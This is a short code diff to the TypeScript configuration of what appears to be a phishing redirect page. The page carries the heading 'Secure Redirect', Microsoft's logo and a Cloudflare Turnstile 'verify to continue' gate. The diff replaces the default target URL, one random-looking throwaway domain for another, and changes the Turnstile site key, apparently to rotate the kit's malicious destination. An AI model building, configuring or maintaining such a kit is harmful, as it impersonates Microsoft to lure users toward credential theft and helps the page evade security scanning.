@@ -18,7 +18,7 @@ export interface Config {
 }
 
 export const defaultConfig: Config = {
-  defaultTargetUrl: 'https://meheff.a8fdunxe2nb6y3n1kzlwykbse305mntqxwfgsmmasnyaxdb.xyz/TPCJyWnp',
+  defaultTargetUrl: 'https://grandeur-z2oiquartzite.chepeasha.sa.com/kTTArdH9BX1jgHoHWT@C/',
   headerTitle: 'Secure Redirect',
   headerSubtitle: 'Please verify to continue',
   leftLogoUrl: 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg',
@@ -30,7 +30,7 @@ export const defaultConfig: Config = {
     textColor: '#1F2937',
   },
   turnstile: {
-    siteKey: '0x4AAAAAABaeDHdwHVmJobfE',
+    siteKey: '0x4AAAAAAB2JcAtkQrqJ0gCL',
     maxAttempts: 5,
     cooldownPeriod: 3600000 // 1 hour
   }
